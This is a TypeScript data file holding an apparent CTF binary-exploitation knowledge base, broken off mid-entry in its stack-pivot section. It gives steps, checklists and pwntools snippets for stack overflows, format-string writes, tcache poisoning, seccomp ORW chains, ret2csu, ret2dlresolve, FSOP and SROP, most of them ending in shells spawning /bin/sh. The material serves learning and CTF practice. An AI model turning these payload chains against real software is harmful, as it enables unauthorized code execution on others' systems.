export interface ExploitationPath {
  name: string;
  description: string;
  steps: string[];
  tools: string[];
  codeSnippet?: string;
  applicableLibc?: string;
  references?: string[];
}

export interface TechniqueDetails {
  id: string;
  name: string;
  category: 'recon' | 'mitigation' | 'technique' | 'leaf' | 'setup';
  class: string;
  description: string;
  
  // Comprehensive preconditions
  preconditions: {
    summary: string;
    required: string[];
    detectionSteps: string[];
    offsetDiscovery?: {
      [key: string]: string;
    };
  };
  
  // Multiple exploitation paths
  exploitationPaths: ExploitationPath[];
  
  // Post-exploitation
  postconditions: {
    successIndicators: string[];
    artifacts: string[];
  };
  
  // Operator workflow
  operatorChecklist: string[];
  
  // Filtering tags
  vulnerabilityTypes: string[];
  
  // References and write-ups
  references: {
    tool?: string;
    url?: string;
    description?: string;
  }[];
  
  children?: string[];
}

// Core tools reference library
export const CORE_TOOLS = {
  checksec: 'Best all-in-one mitigation scanner',
  readelf: 'ELF headers, sections, dynamic entries, RELRO, PIE',
  objdump: 'Disassembly, symbol tables, GOT/PLT layout',
  file: 'Basic architecture & ELF type detection',
  pwndbg: 'Enriched GDB: vmmap, heap, canary, telescope',
  GEF: 'GDB Enhanced Features: heap-analysis-helper, pattern',
  PEDA: 'Pattern generation, searchmem, context',
  gdb: 'Base debugger',
  'radare2/rabin2': 'Fast static + dynamic analysis alternative',
  pwntools: 'Exploit framework: cyclic, flat, fit, ELF, ROP, tubes',
  ROPgadget: 'ROP chain gadget search',
  ropper: 'Alternative gadget finder (cleaner output)',
  one_gadget: 'Libc execve one-gadget finder',
  'libc-database': 'Offline libc version lookup by symbol offsets',
  'libc.rip': 'Online libc symbol resolver',
  'seccomp-tools': 'Dump & analyze seccomp BPF filters',
  ltrace: 'Library call tracer',
  strace: 'Syscall tracer',
  strings: 'Static string extraction',
  nm: 'Symbol table dump',
  ldd: 'Shared library dependency listing',
  strip: 'Symbol strip detection',
  'vmmap (pwndbg)': 'Runtime memory map with permissions',
};

export const PWN_KNOWLEDGE_BASE: Record<string, TechniqueDetails> = {
  stack_buffer_overflow: {
    id: 'stack_buffer_overflow',
    name: 'Stack-Based Buffer Overflow (SBOF)',
    category: 'technique',
    class: 'Memory Corruption',
    description: 'Exploits by overwriting stack buffers to redirect execution flow and achieve RCE',
    
    preconditions: {
      summary: 'A fixed-size stack buffer exists and user-controlled input is written into it without proper length validation.',
      required: [
        'Vulnerable input function: gets(), read() with oversized count, scanf("%s"), strcpy(), strcat(), fgets() with wrong size',
        'Target buffer allocated on stack frame (local variable)',
        'Input length controllable by attacker (minimum buffer_size + 8 bytes for 64-bit RIP overwrite)',
        'No stack canary OR canary value is leaked/bypassable',
        'NX disabled (for shellcode) OR ROP gadgets/ret2libc available',
        'ASLR known or leaked if PIE/libc addresses needed'
      ],
      detectionSteps: [
        'Run: checksec --file=./binary → note canary/NX/PIE/RELRO status',
        'In GDB: disas <vuln_function> → look for call to gets/read/scanf',
        'Use cyclic (pwntools) or pattern_create to determine exact offset to RIP',
        'Send cyclic(200) payload → examine crash → extract RIP overwrite offset'
      ],
      offsetDiscovery: {
        'pwntools': 'cyclic(200) → crash → cyclic_find(core.read(rsp, 4))',
        'pwndbg': 'cyclic 200 → run → cyclic -l $rsp',
        'GEF': 'pattern create 200 → run → pattern search $rsp',
        'PEDA': 'pattern create 200 → run → pattern search'
      }
    },
    
    exploitationPaths: [
      {
        name: 'ret2shellcode (NX disabled, no PIE or leak available)',
        description: 'Inject executable shellcode directly into the buffer and redirect execution to it',
        steps: [
          'Find writable+executable memory region (vmmap in pwndbg)',
          'Inject shellcode into the buffer or adjacent memory',
          'Overwrite RIP with buffer/shellcode address',
          'Use NOP sled (0x90) to increase hit probability'
        ],
        tools: ['pwntools (shellcraft, asm)', 'pwndbg vmmap', 'objdump -d', 'msfvenom'],
        codeSnippet: `shellcode = asm(shellcraft.sh())
padding = b'A' * offset
payload = shellcode.ljust(offset, b'\\x90') + p64(buf_addr)
p.send(payload)`,
        references: [
          { description: 'PwnTools Shellcraft Documentation' },
          { tool: 'msfvenom', description: 'Metasploit shellcode generator' }
        ]
      },
      {
        name: 'ret2libc (NX enabled, ASLR off or leak available)',
        description: 'Chain libc functions (system) with controlled arguments to spawn shell',
        steps: [
          'Find offset to RIP using cyclic pattern',
          'Locate "pop rdi; ret" gadget for first argument setup',
          'Find /bin/sh string in libc address space',
          'Build chain: pop_rdi → &"/bin/sh" → system()',
          'If ASLR: leak libc via puts(got_entry), compute base = leak - symbol_offset'
        ],
        tools: ['ROPgadget', 'ropper', 'pwntools ROP class', 'one_gadget', 'libc.rip', 'libc-database'],
        codeSnippet: `rop = ROP(libc)
sh_addr = next(libc.search(b'/bin/sh'))
rop.call('system', [sh_addr])
payload = b'A' * offset + rop.chain()
p.send(payload)`,
        applicableLibc: 'All versions',
        references: [
          { description: 'ret2libc attack technique', url: 'https://ctf101.org/binary-exploitation/return-oriented-programming/' },
          { tool: 'one_gadget', description: 'Single-gadget RCE finder for libc' }
        ]
      },
      {
        name: 'ret2plt (call PLT stub for information leak)',
        description: 'Leak libc base by calling puts(GOT_entry) to enable ASLR bypass',
        steps: [
          'Locate puts@plt or printf@plt in binary PLT section',
          'Call puts@plt with GOT entry address to leak libc address',
          'Compute libc base: base = leak - known_offset_in_libc',
          'Return to vulnerable function for second stage exploitation',
          'Execute final ROP chain with computed libc addresses'
        ],
        tools: ['pwntools ELF (elf.plt, elf.got)', 'ROPgadget', 'pwntools ROP', 'readelf'],
        references: [
          { description: 'Two-stage exploitation with information leaks' }
        ]
      },
      {
        name: 'ret2syscall / SROP (no libc available)',
        description: 'Direct syscall gadgets or signal frame manipulation for RCE without libc',
        steps: [
          'Find "syscall; ret" and "pop rax; ret" gadgets via ROPgadget',
          'Set rax=59 (execve), rdi=&"/bin/sh", rsi=0, rdx=0',
          'Alternatively: trigger SIGSEGV → use sigreturn syscall to craft fake signal frame',
          'SROP can bypass restrictions where function calls are filtered'
        ],
        tools: ['ROPgadget', 'ropper', 'pwntools SigreturnFrame'],
        applicableLibc: 'Stripped binaries or libc unavailable',
        references: [
          { description: 'SROP: Exploiting the Processor using Signals' }
        ]
      }
    ],
    
    postconditions: {
      successIndicators: [
        'RIP/EIP register controlled and redirected to attacker payload',
        'Shell spawned (interactive or reverse shell)',
        'Arbitrary code execution achieved with target process privileges'
      ],
      artifacts: [
        'Core dump showing controlled instruction pointer',
        'Shell session with target user privileges',
        'Flag file read in CTF context'
      ]
    },
    
    operatorChecklist: [
      '[ ] Run checksec → record canary/NX/PIE/RELRO status',
      '[ ] Identify vulnerable function via disassembly (objdump / GDB)',
      '[ ] Calculate exact RIP offset using cyclic payload + crash analysis',
      '[ ] Determine exploitation path based on protections (ASLR, canary, NX)',
      '[ ] Find required ROP gadgets (ROPgadget / ropper)',
      '[ ] Identify libc version if needed (ldd, libc.rip, one_gadget)',
      '[ ] Craft pwntools exploit script with correct padding + ROP chain',
      '[ ] Test locally with ASLR disabled (echo 0 > /proc/sys/kernel/randomize_va_space)',
      '[ ] If ASLR enabled: leak addresses → recompute offsets dynamically',
      '[ ] Test against remote target with correct libc version matched'
    ],
    
    vulnerabilityTypes: ['stack', 'buffer'],
    
    references: [
      { tool: 'pwntools', description: 'Python exploitation framework' },
      { tool: 'pwndbg', description: 'Enhanced GDB plugin for exploit development', url: 'https://github.com/pwndbg/pwndbg' },
      { tool: 'ROPgadget', description: 'ROP chain gadget search utility' },
      { description: 'CTF101: Binary Exploitation', url: 'https://ctf101.org/binary-exploitation/' }
    ]
  },

  format_string_vulnerability: {
    id: "format_string_vulnerability",
    name: "Format String Vulnerability (FSB)",
    category: "technique",
    class: "Format String Exploitation",
    description: "Exploit printf-family functions with user-controlled format strings for arbitrary read/write.",
    
    preconditions: {
      summary: "User input used as format string argument without %s.",
      required: [
        "Vulnerable func: printf(user_input)",
        "Controllable input string"
      ],
      detectionSteps: [
        "1. Fuzz: Send `%p.%p.%p`",
        "2. Verify: Output shows memory addresses",
        "3. Find Offset: Send `AAAA.%p.%p...` until `0x41414141` appears"
      ],
      offsetDiscovery: {
        "pwntools FmtStr": "def exec_fmt(p): ...; fmt = FmtStr(exec_fmt)",
        "manual": "Send AAAA + .%p*N until 0x41414141 appears"
      }
    },
    
    exploitationPaths: [
      {
        name: "Arbitrary Read (Memory Leak)",
        description: "Read stack contents or specific memory addresses.",
        steps: [
          "1. Find target address to leak (e.g., GOT entry for puts)",
          "2. Find the offset of your input on the stack",
          "3. Build payload: [Address] + %<offset>$s"
        ],
        tools: ["pwntools fmtstr"],
        codeSnippet: "payload = p64(got_puts) + b\"%7$s\"\np.sendline(payload)"
      },
      {
        name: "Arbitrary Write (%n)",
        description: "Write data to arbitrary memory addresses.",
        steps: [
          "1. Find target address to write (e.g., GOT entry for printf)",
          "2. Find the offset of your input on the stack",
          "3. Build payload: Write system() address to printf GOT"
        ],
        tools: ["pwntools fmtstr_payload"],
        codeSnippet: "writes = {got_printf: system_addr}\npayload = fmtstr_payload(offset, writes)\np.sendline(payload)"
      }
    ],
    
    postconditions: {
      successIndicators: ["Memory leaked successfully", "GOT overwritten"],
      artifacts: ["Leaked values"]
    },
    
    operatorChecklist: [
      "[ ] Verify format string works: input %x.%x.%x.%x or %p.%p.%p.%p",
      "[ ] Find exact input offset on stack: send AAAA%N$p until AAAA appears",
      "[ ] Check RELRO level (Partial/No RELRO required for GOT overwrite via %n)",
      "[ ] If Full RELRO: target __malloc_hook, __free_hook, or FSOP instead of GOT",
      "[ ] Determine available specifiers: %p (leak), %n (write), %hn (short write), %hhn (byte write)",
      "[ ] Build write payload with pwntools fmtstr_payload if GOT overwrite possible",
      "[ ] Test read (%p) before attempting write (%n) to confirm offset",
    ],
    
    vulnerabilityTypes: ["CWE-134", "Format String"],
    
    references: []
  },

  heap_buffer_overflow: {
    id: 'heap_buffer_overflow',
    name: 'Heap Buffer Overflow',
    category: 'technique',
    class: 'Heap Exploitation',
    description: 'Overflow heap chunks to corrupt metadata (chunk size, size flag, fd/bk pointers) of adjacent chunks.',
    
    preconditions: {
      summary: 'Missing bounds checks on heap-allocated buffers.',
      required: [
        'Vulnerable heap buffer input',
        'Controllable overflow size and data'
      ],
      detectionSteps: [
        '1. GDB: `heap` or `vis` to view chunks',
        '2. Fuzz: Send oversized input to target chunk',
        '3. Inspect: Verify next chunk header fields (size, flags) are overwritten'
      ],
      offsetDiscovery: {
        'manual': 'Offset = allocated chunk data size + 8 (for next chunk header size field)'
      }
    },
    
    exploitationPaths: [
      {
        name: 'Tcache Poisoning (glibc >= 2.26)',
        description: 'Corrupt next-pointer of a freed chunk in tcache to get arbitrary allocation.',
        steps: [
          '1. Allocate chunk A and chunk B',
          '2. Free chunk A (freed chunk is now in tcache)',
          '3. Overflow A from B (or UAF write on A) to overwrite fd/next pointer to target target_addr',
          '4. Allocate chunk (gets A), allocate again (gets chunk at target_addr)',
          '5. Write payload to target_addr'
        ],
        tools: ['pwndbg tcachebins'],
        codeSnippet: `malloc(0x20) # chunk A
free(chunk_A)
# Overflow/UAF write chunk_A->fd with target_addr
malloc(0x20) # returns chunk_A
malloc(0x20) # returns target_addr!`
      }
    ],
    
    postconditions: {
      successIndicators: ['Arbitrary allocation achieved', 'Heap state successfully modified'],
      artifacts: ['Heap visualization log']
    },
    
    operatorChecklist: [
      '[ ] Determine glibc version: ldd ./binary; strings /path/to/libc.so.6 | grep "GNU C"',
      '[ ] Check if Safe Linking XOR protection is enabled (glibc >= 2.32)',
      '[ ] Check if tcache is enabled (glibc >= 2.26) and count limits',
      '[ ] Identify vulnerable buffer and overflow size (how many bytes past chunk boundary)',
      '[ ] Allocate/free chunks to set up a clean heap layout before exploitation',
      '[ ] Corrupt next chunk metadata (size, fd, bk) via the overflow',
      '[ ] Determine target chunk for corruption (tcache, fastbin, unsorted bin)',
      '[ ] Verify corruption in GDB: pwndbg bins, vis_heap_chunks',
      '[ ] Chain to code execution: allocate controlled chunk, overwrite hook/vtable/FSOP',
    ],
    
    vulnerabilityTypes: ['CWE-122', 'Heap Overflow'],
    references: []
  },

  sandbox_escape: {
    id: 'sandbox_escape',
    name: 'Sandbox / Seccomp Escape',
    category: 'technique',
    class: 'Sandbox Bypass',
    description: 'Bypass seccomp-bpf filters (sandboxes) typically by using ORW (Open-Read-Write) chains.',
    
    preconditions: {
      summary: 'Process is restricted by a seccomp BPF filter.',
      required: [
        'seccomp-bpf filter active',
        'Standard execution syscalls (execve) blocked',
        'Alternative syscalls (open/read/write) or equivalents allowed'
      ],
      detectionSteps: [
        '1. Dump rules: `seccomp-tools dump ./binary`',
        '2. Analyze: Check if execve is KILL/ERR',
        '3. Plan: Find alternative allowed syscalls'
      ]
    },
    
    exploitationPaths: [
      {
        name: 'ORW (Open-Read-Write) Chain',
        description: 'Read the flag using open(), read(), write() syscalls instead of spawning a shell.',
        steps: [
          '1. Find gadgets for: syscall, pop rdi, pop rsi, pop rdx, pop rax',
          '2. Call open("flag.txt", O_RDONLY)',
          '3. Call read(fd, buffer, size)',
          '4. Call write(1, buffer, size) to print the flag'
        ],
        tools: ['seccomp-tools', 'ROPgadget', 'pwntools ROP'],
        codeSnippet: `rop.call('open', [flag_str_addr, 0])
rop.call('read', [3, bss_buffer, 0x100])
rop.call('write', [1, bss_buffer, 0x100])`
      }
    ],
    
    postconditions: {
      successIndicators: ['Flag file read and output captured via stdout'],
      artifacts: ['seccomp-tools dump']
    },
    
    operatorChecklist: [
      '[ ] Run seccomp-tools dump',
      '[ ] Check if open/openat are allowed',
      '[ ] Check if read/pread64/readv are allowed',
      '[ ] Check if write/pwrite64/writev are allowed',
      '[ ] Build ORW ROP chain'
    ],
    
    vulnerabilityTypes: ['Sandbox', 'Seccomp'],
    references: []
  },

  ret2csu: {
    id: 'ret2csu',
    name: 'Ret2csu (Return-to-csu)',
    category: 'technique',
    class: 'ret2csu',
    description: 'A ROP technique that uses the universally available __libc_csu_init gadgets in dynamically linked x64 ELF binaries to populate RDX, RSI, RDI, and call an arbitrary function pointer. Extremely useful when standard pop rdx/rsi/rdi gadgets are missing.',
    preconditions: {
      summary: 'Dynamically linked x64 ELF binary with a buffer overflow, lacking standard ROP gadgets (specifically pop rdx).',
      required: [
        'Buffer overflow allowing RIP control',
        'x64 dynamically linked ELF binary',
        '__libc_csu_init function present in the binary (typically present by default in gcc up to ~v11)'
      ],
      detectionSteps: [
        'Run `objdump -d binary | grep __libc_csu_init` to verify existence',
        'Use ROPgadget or ropper to search for `pop rdx`. If none exist, ret2csu is a strong candidate.'
      ]
    },
    exploitationPaths: [
      {
        name: 'Standard ret2csu sequence',
        description: 'Execute the two-stage gadget from __libc_csu_init to call a function with 3 controlled arguments.',
        steps: [
          'Locate the two gadgets in __libc_csu_init (Gadget 1: pop rbx, rbp, r12, r13, r14, r15; Gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]).',
          'Chain Gadget 1 to setup registers: rbx=0, rbp=1, r12=function_ptr, r13=arg1(rdi), r14=arg2(rsi), r15=arg3(rdx).',
          'Chain into Gadget 2. It will set rdx, rsi, rdi, and call [r12].',
          'Since rbx=0 and rbp=1, the subsequent cmp and jne will fall through, popping 7 values (add rsp, 8 and 6 pops).',
          'Pad the ROP chain with 7 * 8 = 56 bytes of junk, then place the next ROP gadget address.'
        ],
        tools: ['ropper', 'pwndbg', 'pwntools'],
        codeSnippet: `def ret2csu(func_ptr, arg1, arg2, arg3):
    # csu_gadget_1: pop rbx, rbp, r12, r13, r14, r15, ret
    # csu_gadget_2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
    payload = p64(csu_gadget_1)
    payload += p64(0)          # rbx = 0
    payload += p64(1)          # rbp = 1
    payload += p64(func_ptr)   # r12 = pointer to function to call
    payload += p64(arg1)       # r13 -> rdi
    payload += p64(arg2)       # r14 -> rsi
    payload += p64(arg3)       # r15 -> rdx
    payload += p64(csu_gadget_2)
    payload += b'JUNKJUNK' * 7 # padding for the pops after call
    return payload`
      }
    ],
    postconditions: {
      successIndicators: ['Target function executed with correct 3 arguments'],
      artifacts: ['Stack state shifted by 56 bytes post-execution']
    },
    operatorChecklist: [
      '[ ] Verify __libc_csu_init exists (not present in very recent gcc versions)',
      '[ ] Find Gadget 1 (pops) and Gadget 2 (movs and call)',
      '[ ] Identify a pointer to the function you want to call (r12 must point to a POINTER to the function, e.g., a GOT entry)',
      '[ ] Build the chain setting rbx=0, rbp=1',
      '[ ] Account for the 56 bytes of junk after the gadget completes'
    ],
    vulnerabilityTypes: ['stack', 'rop'],
    references: [
      { description: 'Return-to-csu (ret2csu) tutorial', url: 'https://ropemporium.com/guide.html' }
    ]
  },

  ret2dlresolve: {
    id: 'ret2dlresolve',
    name: 'Return-to-dl-resolve',
    category: 'technique',
    class: 'ret2dlresolve',
    description: 'A technique that exploits the lazy binding mechanism of the dynamic linker (_dl_runtime_resolve). By forging Elf32_Rel/Elf64_Rela, Elf32_Sym/Elf64_Sym, and string table entries in memory, an attacker forces the dynamic linker to resolve and execute an arbitrary function (like system) instead of a legitimate one, all without needing a libc leak.',
    preconditions: {
      summary: 'Dynamically linked ELF binary with NO RELRO or Partial RELRO, and a buffer overflow large enough to hold forged structures.',
      required: [
        'Buffer overflow allowing RIP control and significant payload space (>100 bytes)',
        'Known writable memory area at a fixed address (to place forged structures)',
        'Partial RELRO or No RELRO (Full RELRO resolves all symbols at startup, removing _dl_runtime_resolve)'
      ],
      detectionSteps: [
        'Run `checksec` to verify RELRO (must not be Full)',
        'Run `checksec` to verify PIE (typically needs No PIE to have a known writable address like .bss)'
      ]
    },
    exploitationPaths: [
      {
        name: 'Forging dynamic linker structures (32-bit/64-bit)',
        description: 'Forge Reloc, Sym, and StrTab entries to trick _dl_runtime_resolve into resolving system().',
        steps: [
          'Identify the address of the PLT0 entry (pushes link_map and jumps to _dl_runtime_resolve).',
          'Calculate the reloc_offset such that .rel.plt + reloc_offset points to your forged Reloc structure in writable memory.',
          'Forge a Reloc structure. Its r_info field must contain a sym_offset pointing to your forged Symbol structure.',
          'Forge a Symbol structure. Its st_name field must contain a string offset pointing to the string "system" in your forged string table.',
          'Build ROP chain: push arg1 (e.g., "/bin/sh" address), jump to PLT0, push reloc_offset.',
          'The dynamic linker will read your forged structures, resolve "system", and execute it with your argument.'
        ],
        tools: ['pwntools (Ret2dlresolvePayload)', 'readelf'],
        codeSnippet: `// Using pwntools simplifies this massively:
elf = ELF('./binary')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr) # read payload into bss
rop.ret2dlresolve(dlresolve)     # trigger dl_resolve
payload = fit({ offset: rop.chain() })
io.sendline(payload)
io.sendline(dlresolve.payload)`
      }
    ],
    postconditions: {
      successIndicators: ['system("/bin/sh") executed without leaking libc'],
      artifacts: ['Forged ELF structures in .bss or other writable section']
    },
    operatorChecklist: [
      '[ ] Verify binary is dynamically linked and NOT Full RELRO',
      '[ ] Find a known, writable memory address (e.g., end of .bss)',
      '[ ] Calculate offsets for Reloc, Sym, and StrTab',
      '[ ] Ensure no bad characters in offsets if input is string-based',
      '[ ] Forge the payload (highly recommend using pwntools Ret2dlresolvePayload)',
      '[ ] Execute ROP chain to trigger PLT0 with forged reloc_offset'
    ],
    vulnerabilityTypes: ['stack', 'rop', 'dynamic-linking'],
    references: [
      { tool: 'pwntools Ret2dlresolvePayload', url: 'https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html' }
    ]
  },

  fsop_exploit: {
    id: 'fsop_exploit',
    name: 'File Stream Oriented Programming (FSOP)',
    category: 'technique',
    class: 'fsop',
    description: 'Exploitation technique that corrupts the internal fields and vtables of glibc _IO_FILE structures (like stdin, stdout, stderr, or dynamically opened files). By modifying the _IO_jump_t vtable or internal pointers, attackers can hijack control flow when file stream operations (like fread, fwrite, or exit/abort flushing) occur.',
    preconditions: {
      summary: 'Ability to overwrite a _IO_FILE structure in memory (e.g., via heap overflow, UAF, or arbitrary write).',
      required: [
        'Memory corruption primitive targeting the heap (where dynamic files live) or libc data section (where stdout/stderr live)',
        'Knowledge of glibc version (critical for vtable mitigation bypasses)'
      ],
      detectionSteps: [
        'Identify arbitrary write or heap overflow',
        'Check if binary uses file operations or if you can trigger exit()/abort() which flushes all open streams via _IO_list_all'
      ]
    },
    exploitationPaths: [
      {
        name: 'Classic FSOP (glibc < 2.24)',
        description: 'Directly overwrite the vtable pointer of a _IO_FILE structure.',
        steps: [
          'Overwrite the _IO_FILE structure in memory.',
          'Set the vtable pointer (at the end of the struct) to point to a forged vtable in memory you control.',
          'Place the address of system() or a one_gadget at the offset of the function that will be called (e.g., _IO_file_overflow).',
          'Trigger a stream operation or exit().'
        ],
        tools: ['pwndbg', 'pwntools']
      },
      {
        name: 'vtable Mitigation Bypass (House of Apple / wide data)',
        description: 'Exploit newer glibc versions (2.24+) that validate vtables against the read-only __libc_IO_vtables section.',
        steps: [
          'Since you cannot point the vtable to your own forged table, point it to an existing but differently purposed vtable within the valid section (e.g., _IO_wstr_jumps).',
          'Forge the _wide_data structure pointer within the _IO_FILE to point to controlled memory.',
          'When a wide-character operation is triggered, the execution will follow the pointers in your forged _wide_data struct, eventually calling an arbitrary function.'
        ],
        tools: ['pwndbg', 'pwntools', 'GDB']
      }
    ],
    postconditions: {
      successIndicators: ['Control flow hijacked during I/O operation or exit()'],
      artifacts: ['Corrupted _IO_FILE structures in libc or heap']
    },
    operatorChecklist: [
      '[ ] Determine glibc version to identify active vtable mitigations',
      '[ ] Identify which _IO_FILE to corrupt (stdout, stderr, or heap file)',
      '[ ] Setup the forged structure with correct magic numbers and flags to bypass initial validation checks',
      '[ ] Setup the forged vtable or wide_data structure',
      '[ ] Trigger the flush or operation (e.g., via return from main, abort(), or puts())'
    ],
    vulnerabilityTypes: ['heap', 'arbitrary-write', 'fsop'],
    references: [
      { description: 'FSOP Introduction', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/io_file/fsop/' },
      { description: 'House of Apple', url: 'https://bbs.kanxue.com/thread-273832.htm' }
    ]
  },

  srop: {
    id: 'srop',
    name: 'Sigreturn Oriented Programming (SROP)',
    category: 'technique',
    class: 'srop',
    description: 'Fakes a signal frame on the stack to set all registers simultaneously via the rt_sigreturn syscall (15 on x86_64), enabling powerful one-shot ROP chains without chaining individual gadgets.',

    preconditions: {
      summary: 'A buffer overflow large enough to hold a signal frame (minimum ~248 bytes on x86_64), plus a syscall; ret gadget to invoke rt_sigreturn.',
      required: [
        'Buffer overflow providing at least ~248 bytes of controllable stack space (SignalFrameStruct size + padding)',
        'A "syscall; ret" gadget (or "syscall" followed by any benign instruction, since rt_sigreturn does not return normally)',
        'Ability to set RAX to 15 (sigreturn syscall number) — usually via a "pop rax; ret" gadget',
        'Stack must be writable (signal frame must be readable by kernel during rt_sigreturn)',
        'No seccomp filter blocking the sigreturn syscall'
      ],
      detectionSteps: [
        'Run: ROPgadget --binary ./binary | grep ": syscall" to find syscall gadgets',
        'Run: ROPgadget --binary ./binary | grep "pop rax" to ensure RAX control',
        'Check: seccomp-tools dump ./binary to verify rt_sigreturn (syscall 15) is allowed',
        'Calculate required overflow space: 0xf8 (x86_64 frame header) + 0x80 (registers) = 0x178 bytes minimum'
      ],
      offsetDiscovery: {
        'pwntools': 'frame = SigreturnFrame() → set registers → frame.bytes()',
        'manual': 'Layout: uc_flags(8) + uc_link(8) + ss_sp(8) + ss_flags(8) + ss_size(8) + r8-r15(64) + rdi-r15(64) + trampoline + rsp+rip fields'
      }
    },

    exploitationPaths: [
      {
        name: 'SROP → execve("/bin/sh")',
        description: 'Craft a sigreturn frame that sets rax=59 (execve), rdi=&"/bin/sh", rsi=0, rdx=0, rip=syscall.',
        steps: [
          'Find a "pop rax; ret" gadget and a "syscall; ret" gadget via ROPgadget/ropper',
          'Create SigreturnFrame: rax=59, rdi=address_of_binsh, rsi=0, rdx=0, rip=syscall_gadget, rsp=any_writable',
          'Build payload: padding + pop_rax + p64(15) + syscall_gadget + frame_bytes',
          'Send payload → overflow triggers pop_rax(15) → syscall(rt_sigreturn) → kernel restores frame → execve runs'
        ],
        tools: ['pwntools SigreturnFrame', 'ROPgadget', 'ropper'],
        codeSnippet: `frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr           # pointer to "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget       # "syscall; ret"

payload = b'A' * offset
payload += p64(pop_rax_gadget)    # pop rax; ret
payload += p64(15)                # SYS_rt_sigreturn
payload += p64(syscall_gadget)    # invoke sigreturn
payload += bytes(frame)           # forged signal frame

p.send(payload)`,
        applicableLibc: 'All versions (kernel-level technique)',
        references: [
          { description: 'Sigreturn Oriented Programming - original paper', url: 'https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf' },
          { tool: 'pwntools SigreturnFrame', description: 'Automatic sigreturn frame generation' }
        ]
      },
      {
        name: 'SROP → mprotect + shellcode',
        description: 'Use SROP to call mprotect(syscall 10) to make a memory region RWX, then pivot to shellcode.',
        steps: [
          'Stage 1 SROP frame: rax=10 (mprotect), rdi=page_base, rsi=0x1000, rdx=7 (RWX), rip=syscall; ret',
          'Set rsp in the frame to point to your shellcode address (mprotect returns to shellcode after syscall)',
          'Requires a separate SROP call; or use a "syscall" gadget that returns to shellcode after mprotect'
        ],
        tools: ['pwntools', 'ROPgadget'],
        codeSnippet: `frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = shellcode_page & ~0xfff  # page-align
frame.rsi = 0x1000
frame.rdx = 7                         # PROT_READ|WRITE|EXEC
frame.rip = syscall_gadget
frame.rsp = shellcode_addr`,
        applicableLibc: 'All versions',
        references: [
          { description: 'SROP + mprotect technique' }
        ]
      },
      {
        name: 'SROP → ORW Chain (open/read/write)',
        description: 'Use multiple consecutive SROP calls to perform file I/O when execve is blocked by seccomp.',
        steps: [
          'Stage 1: SROP for open("flag", O_RDONLY). rax=2, rdi=&"flag", rsi=0',
          'Set rip in frame to the next SROP gadget (syscall + pop_rax + sigreturn) so it chains to Stage 2',
          'Stage 2: SROP for read(fd=3, buf, 0x100). rax=0, rdi=3, rsi=buf, rdx=0x100',
          'Stage 3: SROP for write(1, buf, 0x100). rax=1, rdi=1, rsi=buf, rdx=0x100'
        ],
        tools: ['pwntools SigreturnFrame', 'seccomp-tools'],
        applicableLibc: 'All versions',
        references: [
          { description: 'SROP ORW chain for seccomp bypass' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'All 15 general-purpose registers set to attacker-controlled values in one step',
        'No need for complex ROP gadget chains — single frame replaces hundreds of bytes of ROP',
        'Shell spawned via execve, or mprotect RWX + shellcode, or ORW flag read'
      ],
      artifacts: [
        'Forged sigreturn frame structure on the stack',
        'rax=15 syscall invocation in GDB trace'
      ]
    },

    operatorChecklist: [
      '[ ] Verify "syscall; ret" gadget exists in binary or libc',
      '[ ] Find "pop rax; ret" gadget (or equivalent: xor eax,eax; inc eax; etc.)',
      '[ ] Calculate exact offset to RIP overwrite via cyclic pattern',
      '[ ] Confirm seccomp does not block rt_sigreturn (syscall 15)',
      '[ ] Create SigreturnFrame via pwntools with desired register state',
      '[ ] Build payload: padding + pop_rax_15 + syscall + frame.bytes()',
      '[ ] If execve is blocked by seccomp, design ORW SROP chain instead',
      '[ ] Test locally in GDB: set breakpoint at "syscall" and inspect registers post-sigreturn',
      '[ ] Send to remote target'
    ],

    vulnerabilityTypes: ['stack', 'srop'],
    references: [
      { tool: 'pwntools', description: 'SigreturnFrame class for automated frame generation' },
      { description: 'SROP: Exploiting the Processor using Signals', url: 'https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf' },
      { description: 'SROP in CTF Challenges', url: 'https://ctf101.org/binary-exploitation/sigreturn-oriented-programming/' }
    ]
  },

  stack_pivot: {
    id: 'stack_pivot',
    name: 'Stack Pivot',
    category: 'technique',
    class: 'stack-pivot',
    description: 'Relocates the stack pointer (RSP) from the real stack to an attacker-controlled memory region (heap, BSS, or libc data). This is essential when the overflow is too small to hold a full ROP chain, but you can redirect RSP to a larger, controlled buffer.',

    preconditions: {
      summary: 'An overflow too small for a complete ROP chain, plus a writable region where a secondary payload can be pre-placed.',
      required: [
        'Stack buffer overflow or format string giving RIP control, but overflow length is limited (e.g., < 40 bytes after RIP)',
        'Writable memory region at a known or leaked address (heap buffer, .bss, libc data section)',
        'A "leave; ret" gadget (most common pivot), or "xchg rsp, rax; ret", or "pop rsp; ret" gadget',
        'Secondary chain pre-written to the pivot destination via earlier I/O or allocation'
      ],
      detectionSteps: [
        'Check overflow size: how many bytes past RIP can you control? If < 100, pivot is likely needed',
        'In GDB: vmmap → find writable regions (heap, .bss, libc writable) — leak or calculate their address',
        'Find pivot gadgets: ROPgadget --binary ./binary | grep -E "leave.*ret|xchg.*rsp|pop rsp"'
      ],
      offsetDiscovery: {
        'leave;ret pivot': 'Set RBP on overflow to fake_rbp = target_addr - 8; "leave" = mov rsp,rbp; pop rbp → RSP = target_addr; then "ret" pops new RIP from there',
        'xchg pivot': 'Control RAX = target_addr; xchg rsp,rax → RSP = target_addr; ret pops RIP from new stack'
      }
    },

    exploitationPaths: [
      {
        name: 'leave;ret Pivot (Classic)',
        description: 'Most common pivot technique. Overwrite saved RBP with a fake frame pointer to redirect RSP via leave;ret.',
        steps: [
          'Place secondary ROP chain at a known writable address (e.g., heap buffer, .bss, or stack frame below)',
          'Overflow the primary buffer: set saved RBP = pivot_destination - 8, set saved RIP = leave;ret gadget',
          'On function epilogue: "leave" → mov rsp,rbp (RSP now points to the fake frame) → pop rbp (pops your fake_rbp+8) → RSP now at your fake frame',
